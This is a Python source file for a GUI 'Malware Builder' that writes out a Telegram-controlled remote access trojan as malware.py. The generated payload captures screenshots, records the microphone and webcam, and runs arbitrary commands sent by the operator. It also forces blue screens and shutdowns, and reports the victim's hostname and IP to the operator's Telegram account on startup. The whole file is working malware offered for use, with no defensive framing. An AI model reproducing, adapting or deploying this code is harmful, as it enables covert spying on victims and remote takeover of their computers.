import customtkinter as ctk
import requests
from PIL import Image, ImageTk
import io
import telebot
import os
import threading
import socket

# GUI Setup
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

class MalwareBuilderGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Malware Builder")
        self.root.geometry("600x400")

        # Left half: Bot avatar and name
        self.avatar_label = ctk.CTkLabel(self.root, text="", width=200, height=200)
        self.avatar_label.place(x=20, y=20)
        self.bot_name_label = ctk.CTkLabel(self.root, text="Enter token to load bot info", font=("Arial", 16))
        self.bot_name_label.place(x=20, y=240)

        # Right half: Inputs
        self.token_label = ctk.CTkLabel(self.root, text="Telegram Bot Token:", font=("Arial", 12))
        self.token_label.place(x=300, y=20)
        self.token_entry = ctk.CTkEntry(self.root, width=250)
        self.token_entry.place(x=300, y=50)
        self.token_entry.bind("<KeyRelease>", self.start_bot_info_thread)

        self.id_label = ctk.CTkLabel(self.root, text="Your Telegram User ID:", font=("Arial", 12))
        self.id_label.place(x=300, y=100)
        self.id_entry = ctk.CTkEntry(self.root, width=250)
        self.id_entry.place(x=300, y=130)

        # Build button
        self.build_button = ctk.CTkButton(self.root, text="Build", command=self.build_malware, width=100, height=40)
        self.build_button.place(x=450, y=340)

    def start_bot_info_thread(self, event=None):
        token = self.token_entry.get()
        if token:
            threading.Thread(target=self.update_bot_info, args=(token,), daemon=True).start()

    def update_bot_info(self, token):
        try:
            bot = telebot.TeleBot(token)
            bot_info = bot.get_me()
            bot_name = bot_info.first_name
            self.bot_name_label.configure(text=f"Bot: {bot_name}")

            # Fetch avatar
            updates = bot.get_updates()
            if updates and hasattr(bot_info, 'photo'):
                file_info = bot.get_file(bot_info.photo.big_file_id)
                file_url = f"https://api.telegram.org/file/bot{token}/{file_info.file_path}"
                img_data = requests.get(file_url).content
                img = Image.open(io.BytesIO(img_data)).resize((180, 180))
                img_tk = ctk.CTkImage(light_image=img, dark_image=img, size=(180, 180))
                self.avatar_label.configure(image=img_tk)
                self.avatar_label.image = img_tk
            else:
                self.avatar_label.configure(image=None, text="No avatar")
        except:
            self.bot_name_label.configure(text="Invalid token")
            self.avatar_label.configure(image=None, text="No avatar")

    def build_malware(self):
        token = self.token_entry.get()
        master_id = self.id_entry.get()
        if not token or not master_id:
            self.bot_name_label.configure(text="Enter token and ID!")
            return

        malware_code = f"""
import telebot
import pyautogui
import webbrowser
import smtplib
from email.mime.text import MIMEText
import ctypes
from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref
import os
import subprocess
import sounddevice as sd
from scipy.io.wavfile import write
import cv2
import requests
from PIL import Image
import io
import time
import socket

bot = telebot.TeleBot('{token}')
MASTER_ID = {master_id}
connected_pcs = {{}}

def register_commands():
    @bot.message_handler(commands=['screenshot'])
    def screenshot(message):
        if message.from_user.id != MASTER_ID:
            return
        try:
            img = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            img.save(img_bytes, format='PNG')
            img_bytes.seek(0)
            bot.send_photo(message.chat.id, img_bytes)
        except Exception as e:
            bot.reply_to(message, f"Error: {{str(e)}}")

    @bot.message_handler(commands=['browser'])
    def open_browser(message):
        if message.from_user.id != MASTER_ID:
            return
        try:
            url = message.text.split(maxsplit=1)[1]
            webbrowser.open(url)
            bot.reply_to(message, "Browser opened.")
        except:
            bot.reply_to(message, "Usage: /browser <url>")

    @bot.message_handler(commands=['email'])
    def send_email(message):
        if message.from_user.id != MASTER_ID:
            return
        try:
            parts = message.text.split(maxsplit=4)
            from_email, app_pass, to_email, subject, body = parts[1:]
            msg = MIMEText(body)
            msg['Subject'] = subject
            msg['From'] = from_email
            msg['To'] = to_email
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(from_email, app_pass)
                server.sendmail(from_email, to_email, msg.as_string())
            bot.reply_to(message, "Email sent.")
        except:
            bot.reply_to(message, "Usage: /email <from> <pass> <to> <subject> <body>")

    @bot.message_handler(commands=['bsod'])
    def bsod(message):
        if message.from_user.id != MASTER_ID:
            return
        try:
            nullptr = POINTER(c_int)()
            windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
            windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B), c_ulong(0), nullptr, nullptr, c_uint(6), byref(c_uint()))
        except:
            bot.reply_to(message, "BSOD failed.")

    @bot.message_handler(commands=['shutdown'])
    def shutdown(message):
        if message.from_user.id != MASTER_ID:
            return
        os.system("shutdown /s /t 0")

    @bot.message_handler(commands=['restart'])
    def restart(message):
        if message.from_user.id != MASTER_ID:
            return
        os.system("shutdown /r /t 0")

    @bot.message_handler(commands=['record_mic'])
    def record_mic(message):
        if message.from_user.id != MASTER_ID:
            return
        try:
            fs = 44100
            seconds = 30
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write('mic.wav', fs, recording)
            bot.send_audio(message.chat.id, open('mic.wav', 'rb'))
            os.remove('mic.wav')
        except Exception as e:
            bot.reply_to(message, f"Error: {{str(e)}}")

    @bot.message_handler(commands=['record_video'])
    def record_video(message):
        if message.from_user.id != MASTER_ID:
            return
        try:
            cap = cv2.VideoCapture(0)
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            out = cv2.VideoWriter('video.mp4', fourcc, 20.0, (640, 480))
            start = time.time()
            while (time.time() - start) < 30:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
            cap.release()
            out.release()
            bot.send_video(message.chat.id, open('video.mp4', 'rb'))
            os.remove('video.mp4')
        except Exception as e:
            bot.reply_to(message, f"Error: {{str(e)}}")

    @bot.message_handler(commands=['webcam_photo'])
    def webcam_photo(message):
        if message.from_user.id != MASTER_ID:
            return
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite('photo.jpg', frame)
                bot.send_photo(message.chat.id, open('photo.jpg', 'rb'))
                os.remove('photo.jpg')
            cap.release()
        except Exception as e:
            bot.reply_to(message, f"Error: {{str(e)}}")

    @bot.message_handler(commands=['ip'])
    def get_ip(message):
        if message.from_user.id != MASTER_ID:
            return
        try:
            ip = requests.get('https://api.ipify.org').text
            bot.reply_to(message, f"IP: {{ip}}")
        except:
            bot.reply_to(message, "Failed to get IP.")

    @bot.message_handler(commands=['taskmgr'])
    def taskmgr(message):
        if message.from_user.id != MASTER_ID:
            return
        os.system("taskmgr")

    @bot.message_handler(commands=['execute'])
    def execute(message):
        if message.from_user.id != MASTER_ID:
            return
        try:
            cmd = message.text.split(maxsplit=1)[1]
            output = subprocess.getoutput(cmd)
            bot.reply_to(message, output or "Executed.")
        except:
            bot.reply_to(message, "Usage: /execute <command>")

    @bot.message_handler(commands=['wallpaper'])
    def wallpaper_url(message):
        if message.from_user.id != MASTER_ID:
            return
        try:
            url = message.text.split(maxsplit=1)[1]
            img_data = requests.get(url).content
            with open('wallpaper.jpg', 'wb') as f:
                f.write(img_data)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath('wallpaper.jpg'), 3)
            bot.reply_to(message, "Wallpaper set.")
            os.remove('wallpaper.jpg')
        except:
            bot.reply_to(message, "Usage: /wallpaper <url>")

    @bot.message_handler(content_types=['photo'])
    def handle_photo(message):
        if message.from_user.id != MASTER_ID or message.caption != '/set_wallpaper':
            return
        try:
            file_info = bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open('wallpaper.jpg', 'wb') as f:
                f.write(downloaded_file)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath('wallpaper.jpg'), 3)
            bot.reply_to(message, "Wallpaper set from photo.")
            os.remove('wallpaper.jpg')
        except Exception as e:
            bot.reply_to(message, f"Error: {{str(e)}}")

    @bot.message_handler(commands=['list_pcs'])
    def list_pcs(message):
        if message.from_user.id != MASTER_ID:
            return
        if connected_pcs:
            pc_list = "\\n".join([f"{{k}}: {{v}}" for k, v in connected_pcs.items()])
            bot.reply_to(message, f"Connected PCs:\\n{{pc_list}}")
        else:
            bot.reply_to(message, "No PCs connected.")

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != MASTER_ID:
        return
    bot.reply_to(message, "Bot activated. Commands registered.")
    register_commands()

# Notify on startup
try:
    hostname = socket.gethostname()
    ip = requests.get('https://api.ipify.org').text
    connected_pcs[hostname] = ip
    bot.send_message(MASTER_ID, f"New PC connected:\\nName: {{hostname}}\\nIP: {{ip}}")
except:
    pass

bot.polling()
"""
        with open('malware.py', 'w') as f:
            f.write(malware_code)
        self.bot_name_label.configure(text="malware.py generated! Compile with pyinstaller.")

if __name__ == "__main__":
    root = ctk.CTk()
    app = MalwareBuilderGUI(root)
    root.mainloop()